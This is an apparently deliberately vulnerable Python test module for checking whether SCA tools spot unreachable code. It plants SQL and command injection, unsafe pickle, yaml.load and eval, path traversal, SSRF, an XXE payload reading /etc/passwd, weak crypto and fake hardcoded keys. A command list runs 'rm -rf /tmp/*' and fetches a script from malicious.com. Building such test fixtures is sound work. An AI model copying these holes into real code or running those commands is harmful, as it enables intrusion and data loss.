"""
Unreachable Vulnerable Module
This module contains vulnerabilities but is NEVER called from the main application
SCA tools should identify these as false positives if they do proper reachability analysis
"""

import os
import subprocess
import sqlite3
import pickle
import yaml
import hashlib
from cryptography.fernet import Fernet
import requests  # vulnerable version 2.19.1

# This entire module is imported but never used - testing false positive detection

def unreachable_sql_injection(user_input):
    """
    UNREACHABLE: This function is never called from main app
    Contains SQL injection vulnerability that should be flagged as false positive
    """
    # Vulnerability: SQL injection
    query = f"SELECT * FROM users WHERE name = '{user_input}'"
    
    try:
        conn = sqlite3.connect('test.db')
        cursor = conn.cursor()
        cursor.execute(query)  # Vulnerable to SQL injection
        results = cursor.fetchall()
        conn.close()
        return results
    except Exception as e:
        return {"error": str(e)}

def unreachable_command_injection(command):
    """
    UNREACHABLE: Command injection vulnerability that's never called
    """
    # Vulnerability: Command injection
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

def unreachable_pickle_vulnerability(data):
    """
    UNREACHABLE: Pickle deserialization vulnerability that's never executed
    """
    # Vulnerability: Unsafe pickle deserialization
    return pickle.loads(data)  # DANGEROUS but unreachable

def unreachable_yaml_vulnerability(yaml_data):
    """
    UNREACHABLE: YAML deserialization vulnerability
    """
    # Vulnerability: Using yaml.load instead of yaml.safe_load
    return yaml.load(yaml_data)  # Dangerous but never called

def unreachable_weak_crypto():
    """
    UNREACHABLE: Weak cryptographic implementations
    """
    # Vulnerability: Weak hashing
    password = "secret123"
    weak_hash = hashlib.md5(password.encode()).hexdigest()
    
    # Vulnerability: Hardcoded key
    key = b'hardcoded_key_123456789012345678901234567890'
    cipher = Fernet(key)
    
    return weak_hash, cipher

def unreachable_path_traversal(filename):
    """
    UNREACHABLE: Path traversal vulnerability
    """
    # Vulnerability: No path validation
    file_path = f"/uploads/{filename}"  # Could be ../../../etc/passwd
    
    try:
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return str(e)

def unreachable_ssrf_vulnerability(url):
    """
    UNREACHABLE: Server-Side Request Forgery using vulnerable requests
    """
    # Vulnerability: SSRF - making requests to user-provided URLs
    try:
        response = requests.get(url, timeout=5)  # Using vulnerable requests version
        return response.text
    except Exception as e:
        return str(e)

def unreachable_information_disclosure():
    """
    UNREACHABLE: Information disclosure vulnerability
    """
    # Vulnerability: Exposing sensitive system information
    sensitive_data = {
        "system_info": os.uname(),
        "environment": dict(os.environ),  # Exposes environment variables
        "current_directory": os.getcwd(),
        "process_id": os.getpid()
    }
    
    return sensitive_data

def unreachable_xml_external_entity():
    """
    UNREACHABLE: XXE vulnerability using lxml
    """
    try:
        from lxml import etree
        
        # Vulnerability: XXE attack
        parser = etree.XMLParser(resolve_entities=True)  # Dangerous
        xml_data = """<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>"""
        
        doc = etree.fromstring(xml_data, parser)  # Vulnerable to XXE
        return etree.tostring(doc)
    except Exception as e:
        return str(e)

def unreachable_insecure_deserialization_chain():
    """
    UNREACHABLE: Complex deserialization chain with multiple vulnerabilities
    """
    # Multiple vulnerabilities in sequence - all unreachable
    
    # 1. Unsafe YAML
    yaml_data = "key: value"
    parsed_yaml = yaml.load(yaml_data)  # Vulnerable
    
    # 2. Unsafe pickle
    pickled = pickle.dumps(parsed_yaml)
    unpickled = pickle.loads(pickled)  # Vulnerable
    
    # 3. Weak crypto
    key = hashlib.md5(b"weak_key").digest()  # Weak
    
    return {"processed": True}

def unreachable_admin_functions():
    """
    UNREACHABLE: Administrative functions with multiple vulnerabilities
    """
    admin_commands = [
        "rm -rf /tmp/*",  # Dangerous command
        "cat /etc/passwd",  # Information disclosure
        "wget http://malicious.com/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh"  # Code injection
    ]
    
    results = []
    for cmd in admin_commands:
        # Vulnerability: Command injection
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        results.append({
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr
        })
    
    return results

class UnreachableVulnerableClass:
    """
    UNREACHABLE: A class with multiple vulnerabilities that's never instantiated
    """
    
    def __init__(self):
        # Vulnerability: Hardcoded credentials
        self.db_password = "admin123"
        self.api_key = "sk-1234567890abcdef"
        
    def vulnerable_method(self, user_input):
        # Vulnerability: SQL injection in method
        query = f"DELETE FROM users WHERE id = {user_input}"
        return query
    
    def another_vulnerable_method(self, data):
        # Vulnerability: Eval usage
        return eval(data)  # DANGEROUS
    
    def file_operations(self, filepath):
        # Vulnerability: Path traversal
        full_path = f"/var/www/{filepath}"  # No validation
        with open(full_path, 'w') as f:
            f.write("data")

# Global variables with vulnerabilities (unreachable)
UNREACHABLE_SECRET_KEY = "hardcoded-secret-key-that-should-not-be-here"
UNREACHABLE_DB_CONNECTION = "postgresql://admin:password123@localhost/prod"
UNREACHABLE_API_KEYS = {
    "aws": "AKIA1234567890ABCDEF",
    "stripe": "sk_live_1234567890abcdef",
    "openai": "sk-1234567890abcdef"
}

def unreachable_crypto_vulnerabilities():
    """
    UNREACHABLE: Various cryptographic vulnerabilities
    """
    # Using deprecated pycrypto
    try:
        from Crypto.Cipher import AES
        key = b'sixteen byte key'  # Too short
        cipher = AES.new(key, AES.MODE_ECB)  # Weak mode
        return cipher
    except ImportError:
        pass
    
    # Weak random number generation
    import random
    weak_token = random.randint(1000, 9999)  # Predictable
    
    return weak_token 